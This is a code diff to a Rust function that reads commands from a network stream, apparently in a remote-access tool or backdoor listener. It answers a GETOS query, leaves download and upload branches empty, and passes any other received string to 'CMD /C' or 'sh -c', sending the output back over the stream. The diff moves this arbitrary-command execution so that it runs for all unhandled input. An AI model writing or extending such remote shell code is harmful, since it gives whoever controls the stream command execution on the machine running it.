@@ -52,6 +52,7 @@ fn cmd(cmd: &str, stream: &mut LigmaListener) -> bool {
                 .as_bytes(),
             )
             .unwrap();
+        return false;
     } else if cmd.len() == 5 {
         if cmd[..=4].eq("GETOS") {
             if cfg!(target_os = "windows") {
@@ -63,20 +64,22 @@ fn cmd(cmd: &str, stream: &mut LigmaListener) -> bool {
             } else {
                 stream.write(b"OTHER").unwrap();
             }
+            return false;
         }
     } else if cmd[..=1].eq("DL") {
+        return false;
     } else if cmd[..=1].eq("UP") {
-    } else {
-        let cmd_out = if cfg!(windows) {
-            Command::new("CMD").arg("/C").arg(&cmd).output().unwrap()
-        } else {
-            Command::new("sh").arg("-c").arg(&cmd).output().unwrap()
-        };
-        let out_str = str::from_utf8(&cmd_out.stdout).unwrap();
-        let err_str = str::from_utf8(&cmd_out.stderr).unwrap();
-        stream
-            .write(format!("{}{}", out_str, err_str).as_bytes())
-            .unwrap();
+        return false;
     }
+    let cmd_out = if cfg!(windows) {
+        Command::new("CMD").arg("/C").arg(&cmd).output().unwrap()
+    } else {
+        Command::new("sh").arg("-c").arg(&cmd).output().unwrap()
+    };
+    let out_str = str::from_utf8(&cmd_out.stdout).unwrap();
+    let err_str = str::from_utf8(&cmd_out.stderr).unwrap();
+    stream
+        .write(format!("{}{}", out_str, err_str).as_bytes())
+        .unwrap();
     false
 }
